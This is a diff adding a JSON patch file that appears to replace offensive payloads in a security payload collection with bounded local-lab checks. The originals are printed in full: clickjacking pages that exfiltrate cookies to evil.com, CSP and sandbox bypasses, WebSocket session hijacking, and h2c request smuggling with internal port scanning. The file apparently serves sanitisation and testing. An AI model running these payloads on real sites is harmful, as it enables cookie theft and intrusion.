@@ -1,0 +1,116 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "clickjacking-xss",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 1. 检测iframe嵌套防护\ncurl -sI \"http://target.com\" | grep -i \"x-frame-options|frame-ancestors\"\n\n# 2. 检测已知XSS点\ncurl -s \"http://target.com/search?q=<script>alert(1)</script>\" | grep -i \"script\"\n\n# 3. 检测Self-XSS (需要用户交互)\ncurl -s \"http://target.com/profile/edit\" -d \"bio=<img+src=x+onerror=alert(document.cookie)>\"",
+          "command": "curl --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/clickjacking/xss-confirm\" | grep -Ei \"^(HTTP/|X-Frame-Options:|Content-Security-Policy:)\"\nnpx playwright test tests/clickjacking-xss-boundary.spec.mjs --project=chromium --reporter=line"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "<html><head>\n<style>\n  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }\n  .step { position:absolute; z-index:1; }\n</style>\n<script>\nvar step = 0;\nfunction nextStep() {\n  step++;\n  if (step === 1) {\n    // 第一步：诱导用户点击\"个人资料编辑\"按钮\n    document.getElementById(\"msg\").innerText = \"Step 1: Click to claim reward!\";\n  } else if (step === 2) {\n    // 第二步：诱导用户点击输入框\n    document.getElementById(\"msg\").innerText = \"Step 2: Click to verify identity!\";\n  } else if (step === 3) {\n    // 第三步：诱导粘贴(Ctrl+V)，执行XSS\n    document.getElementById(\"msg\").innerText = \"Step 3: Press Ctrl+V to paste verification code!\";\n    navigator.clipboard.writeText('<img src=x onerror=\"fetch('https://evil.com/steal?'+document.cookie)\">');\n  }\n}\n</script></head>\n<body onload=\"nextStep()\">\n  <h1 id=\"msg\">Loading prize...</h1>\n  <button class=\"step\" onclick=\"nextStep()\" style=\"top:200px;left:100px;\">Next Step</button>\n  <iframe src=\"http://target.com/profile/edit\"></iframe>\n</body></html>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Multi-step interaction lab</title>\n<style>\n  .stage { position: relative; width: 640px; height: 360px; }\n  iframe { position: absolute; inset: 0; width: 640px; height: 360px; opacity: .12; border: 0; }\n  .guide { position: absolute; left: 96px; top: 190px; z-index: 2; pointer-events: none; }\n</style>\n<div class=\"stage\">\n  <strong class=\"guide\">CJ_XSS_STEP_A1</strong>\n  <iframe src=\"http://127.0.0.1:18080/lab/clickjacking/xss-confirm?marker=CJ_XSS_STEP_A1\" sandbox=\"allow-forms allow-scripts\"></iframe>\n</div>"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "<html><head>\n<style>\n  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }\n</style></head>\n<body>\n  <h1>Free WiFi Login</h1>\n  <p>Please click \"Connect\" to access free WiFi</p>\n  <button style=\"padding:15px 40px; font-size:18px; margin-top:20px;\">Connect</button>\n  <!-- iframe加载含XSS的URL，按钮位置精确对齐触发XSS -->\n  <iframe src=\"http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\"></iframe>\n</body></html>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Interaction-gated XSS marker lab</title>\n<button type=\"button\">Activate local preview</button>\n<iframe style=\"width:640px;height:320px;opacity:.15;border:1px solid #cbd5e1\" src=\"http://127.0.0.1:18080/lab/clickjacking/xss-preview?value=%3Cimg%20src%3Dx%20onerror%3D%22document.body.dataset.lab%3D%27CJ_XSS_DOM_B2%27%22%3E\"></iframe>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<!-- 利用data: URI绕过CSP（旧浏览器） -->\n<iframe src=\"data:text/html,<script>alert(document.domain)</script>\"></iframe>\n\n<!-- blob: URI绕过 -->\n<script>\nvar blob = new Blob(['<script>alert(1)<\\/script>'], {type: 'text/html'});\ndocument.getElementById('frame').src = URL.createObjectURL(blob);\n</script>\n\n<!-- srcdoc属性绕过 -->\n<iframe srcdoc=\"<script>alert(document.domain)</script>\"></iframe>",
+          "command": "<iframe id=\"frame\" sandbox=\"allow-scripts\" srcdoc=\"<script>document.body.dataset.lab='CJ_XSS_SRCDOC_C3'</script>\"></iframe>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<!-- sandbox allow-scripts允许执行JS -->\n<iframe src=\"https://target.com\" sandbox=\"allow-scripts allow-same-origin\">\n</iframe>\n<!-- 利用allow-popups逃逸 -->\n<iframe src=\"https://target.com\" sandbox=\"allow-scripts allow-popups allow-popups-to-escape-sandbox\">\n</iframe>\n\n<!-- allow-top-navigation + 点击劫持 -->\n<iframe src=\"https://target.com\" sandbox=\"allow-scripts allow-top-navigation-by-user-activation\">\n</iframe>",
+          "command": "<iframe src=\"http://127.0.0.1:18080/lab/clickjacking/sandbox-preview?marker=CJ_XSS_SANDBOX_D4\" sandbox=\"allow-scripts allow-popups\"></iframe>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<!-- 拖放劫持将XSS payload注入目标页面 -->\n<style>\n#drag { position: absolute; z-index: 1; opacity: 0; }\n#target { position: absolute; z-index: 0; }\n</style>\n\n<div id=\"drag\" draggable=\"true\"\n  ondragstart=\"event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')\">\n  Drag me\n</div>\n\n<iframe id=\"target\" src=\"https://target.com/page-with-editable-field\"\n  sandbox=\"allow-scripts allow-same-origin\">\n</iframe>",
+          "command": "<div id=\"drag\" draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','CJ_XSS_DRAG_E5')\">CJ_XSS_DRAG_E5</div>\n<iframe id=\"target\" src=\"http://127.0.0.1:18080/lab/clickjacking/editable-preview\" sandbox=\"allow-forms\"></iframe>"
+        }
+      ]
+    },
+    {
+      "id": "ws-auth-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 抓取WebSocket握手和初始消息\n# 在浏览器Console中:\nconst origWS = WebSocket;\nwindow.WebSocket = function(url, protocols) {\n  console.log(\"[WS] Connecting to:\", url);\n  const ws = new origWS(url, protocols);\n  const origSend = ws.send.bind(ws);\n  ws.send = function(data) {\n    console.log(\"[WS] SEND:\", data);\n    origSend(data);\n  };\n  ws.addEventListener(\"message\", e => console.log(\"[WS] RECV:\", e.data));\n  return ws;\n};\n\n# 观察认证流程：\n# 1. Cookie/Token在握手阶段传递？\n# 2. 连接后发送auth消息？\n# 3. 是否有心跳保活机制？",
+          "command": "npx playwright test tests/websocket-auth-lifecycle.spec.mjs --project=chromium --reporter=line"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 测试Token过期后是否仍可使用\n# Step 1: 记录有效Token\nTOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"\n\n# Step 2: 等待Token过期/注销账号\n# Step 3: 尝试用旧Token建立WebSocket连接\nwebsocat \"wss://{TARGET}/ws\" \\\n  -H \"Authorization: Bearer $TOKEN\" 2>&1 | head -5\n\n# 测试WebSocket连接在用户注销后是否仍然活跃\n# (WebSocket长连接可能不受HTTP会话注销影响)\n\n# 会话固定——使用他人Token\nwebsocat \"wss://{TARGET}/ws\" \\\n  -H \"Cookie: session={OTHER_USER_SESSION}\"",
+          "command": "for token in LAB_ACTIVE_TOKEN LAB_EXPIRED_TOKEN LAB_REVOKED_TOKEN; do printf \"token=%s\\n\" \"$token\"; websocat --max-messages 1 -H=\"Authorization: Bearer $token\" ws://127.0.0.1:18080/ws/auth-lab 2>&1 | head -n 3; done"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 订阅其他用户的私有频道\nws.send(JSON.stringify({\n  action: \"subscribe\",\n  channel: \"user.1002.notifications\"  // 尝试订阅其他用户\n}));\n\n# 订阅管理员频道\nws.send(JSON.stringify({\n  action: \"subscribe\",\n  channel: \"admin.dashboard\"\n}));\n\n# 遍历频道ID\nfor (let i = 1; i <= 100; i++) {\n  ws.send(JSON.stringify({\n    action: \"subscribe\",\n    channel: `user.${i}.messages`\n  }));\n}\n\n# 测试频道名注入\nws.send(JSON.stringify({\n  action: \"subscribe\",\n  channel: \"public.*\"  // 通配符订阅\n}));",
+          "command": "socket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-self.notifications\", marker: \"WS_AUTHZ_A1\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-other.notifications\", marker: \"WS_AUTHZ_B2\"}));"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 测试消息速率限制\nimport asyncio, websockets, json, time\n\nasync def rate_test():\n    uri = \"wss://{TARGET}/ws\"\n    async with websockets.connect(uri) as ws:\n        # 快速发送消息测试速率限制\n        start = time.time()\n        for i in range(1000):\n            await ws.send(json.dumps({\"action\": \"ping\", \"seq\": i}))\n        elapsed = time.time() - start\n        print(f\"Sent 1000 messages in {elapsed:.2f}s\")\n        \n        # 大消息测试\n        large_msg = \"A\" * (1024 * 1024)  # 1MB\n        try:\n            await ws.send(large_msg)\n            print(\"Large message accepted - no size limit!\")\n        except Exception as e:\n            print(f\"Large message rejected: {e}\")\n\nasyncio.run(rate_test())",
+          "command": "import asyncio\nimport json\nimport websockets\n\nasync def bounded_limits():\n    async with websockets.connect(\"ws://127.0.0.1:18080/ws/auth-lab\", subprotocols=[\"payloader-lab-v1\"]) as socket:\n        for sequence in range(5):\n            await socket.send(json.dumps({\"action\": \"ping\", \"sequence\": sequence}))\n        await socket.send(json.dumps({\"action\": \"echo\", \"marker\": \"A\" * 65536}))\n        print(await asyncio.wait_for(socket.recv(), timeout=2))\n\nasyncio.run(bounded_limits())"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用低权限Token获取高权限WebSocket连接\n# 某些实现仅在握手时验证Token，连接后不再检查\n\n# 利用WebSocket重连机制\n# 某些客户端实现会在断线后自动重连\n# 拦截重连请求替换Token\n\n# 协议降级攻击\n# 从wss://降级到ws://(如果后端支持)\nwebsocat \"ws://{TARGET}/ws\" -H \"Cookie: session={TOKEN}\"\n\n# 利用Socket.io/SockJS的HTTP降级\ncurl \"https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}\"",
+          "command": "websocat --max-messages 1 -H=\"Authorization: Bearer LAB_ACTIVE_TOKEN\" ws://127.0.0.1:18080/ws/auth-lab\ncurl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/socket.io/?EIO=4&transport=polling&sid=LAB_SESSION\" -D - -o /dev/null | grep -Ei \"^(HTTP/|Access-Control-Allow-Origin:|Set-Cookie:)\""
+        }
+      ]
+    },
+    {
+      "id": "ws-smuggling",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 测试Upgrade响应\ncurl -i -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGVzdA==\" \\\n  \"https://{TARGET}/\"\n\n# 测试H2C走私(HTTP/2 Cleartext)\ncurl -i -H \"Connection: Upgrade, HTTP2-Settings\" \\\n  -H \"Upgrade: h2c\" \\\n  -H \"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\" \\\n  \"https://{TARGET}/\"\n\n# 检测代理类型\ncurl -I \"https://{TARGET}/\" | grep -iE \"server:|via:|x-powered-by:\"",
+          "command": "curl --http1.1 --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/proxy/ws-upgrade\" -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" | grep -Ei \"^(HTTP/|Connection:|Upgrade:)\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 使用Python构造WebSocket走私\nimport socket, ssl, base64\n\ndef ws_smuggle(target_host, target_port, internal_path):\n    # WebSocket握手\n    key = base64.b64encode(b\"test1234test1234\").decode()\n    upgrade = (\n        f\"GET / HTTP/1.1\\r\\n\"\n        f\"Host: {target_host}\\r\\n\"\n        f\"Upgrade: websocket\\r\\n\"\n        f\"Connection: Upgrade\\r\\n\"\n        f\"Sec-WebSocket-Version: 13\\r\\n\"\n        f\"Sec-WebSocket-Key: {key}\\r\\n\"\n        f\"\\r\\n\"\n    )\n    \n    ctx = ssl.create_default_context()\n    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)\n    sock.connect((target_host, target_port))\n    sock.send(upgrade.encode())\n    \n    resp = sock.recv(4096).decode()\n    print(f\"Upgrade response: {resp[:100]}\")\n    \n    if \"101\" in resp:\n        # 走私HTTP请求到内网\n        smuggled = (\n            f\"GET {internal_path} HTTP/1.1\\r\\n\"\n            f\"Host: 127.0.0.1\\r\\n\"\n            f\"\\r\\n\"\n        )\n        sock.send(smuggled.encode())\n        print(sock.recv(4096).decode())\n\nws_smuggle(\"{TARGET}\", 443, \"/admin/\")",
+          "command": "python -c \"import socket; request=b'GET /lab/proxy/ws-upgrade HTTP/1.1\\r\\nHost: 127.0.0.1:18080\\r\\nConnection: Upgrade\\r\\nUpgrade: websocket\\r\\nSec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\n\\r\\nGET /lab/internal/canary HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n'; s=socket.create_connection(('127.0.0.1',18080),timeout=3); s.sendall(request); print(s.recv(4096).decode('latin1','replace')); s.close()\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# h2cSmuggler工具\npython3 h2cSmuggler.py -x \"https://{TARGET}\" \\\n  \"http://{TARGET}/admin/\"\n\n# 手动H2C走私——访问内部API\npython3 h2cSmuggler.py -x \"https://{TARGET}\" \\\n  \"http://127.0.0.1:8080/api/internal/users\"\n\n# 扫描内网端口\nfor port in 80 8080 8443 9090 3000 5000; do\n  python3 h2cSmuggler.py -x \"https://{TARGET}\" \\\n    \"http://127.0.0.1:$port/\" 2>/dev/null && echo \"Port $port: OPEN\"\ndone",
+          "command": "curl --http2-prior-knowledge --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/proxy/h2c\" | grep -Ei \"^(HTTP/|Upgrade:|Connection:)\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# Nginx WebSocket走私\n# 如果Nginx配置proxy_pass到后端\n# 但未限制Upgrade请求\n\n# 测试反向代理路径差异\ncurl -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  \"https://{TARGET}/..;/admin/\"\n\n# Varnish缓存投毒+WebSocket\ncurl -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  -H \"X-Forwarded-Host: evil.com\" \\\n  \"https://{TARGET}/\"\n\n# HAProxy WebSocket走私\n# 利用HAProxy在Upgrade后不再检查后续请求\ncurl -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  \"https://{TARGET}/\" --next -H \"Host: internal\" \"https://{TARGET}/admin/\"",
+          "command": "rg -n 'proxy_(http_version|set_header|pass)|Upgrade|Connection|h2c' config nginx server\ncurl --http1.1 --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/proxy/admin-canary\" -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" | grep -Ei \"^(HTTP/|Upgrade:|Connection:)\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 大小写混淆\nConnection: upgrade\nUpgrade: WebSocket  # 大小写变体\nUpgrade: WEBSOCKET\n\n# 分块传输隐藏走私内容\nTransfer-Encoding: chunked\n# 在WebSocket帧中嵌入HTTP请求\n\n# 使用WebSocket Extension混淆\nSec-WebSocket-Extensions: permessage-deflate\n# 压缩后的恶意消息难以被WAF检测\n\n# 伪装为正常WebSocket流量\n# 先发送正常消息，延迟后发送走私请求",
+          "command": "for value in websocket WebSocket WEBSOCKET; do printf \"upgrade=%s\\n\" \"$value\"; curl --http1.1 --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/proxy/ws-upgrade\" -H \"Connection: upgrade\" -H \"Upgrade: $value\" | grep -Ei \"^(HTTP/|Upgrade:|Connection:)\"; done"
+        }
+      ]
+    }
+  ]
+}
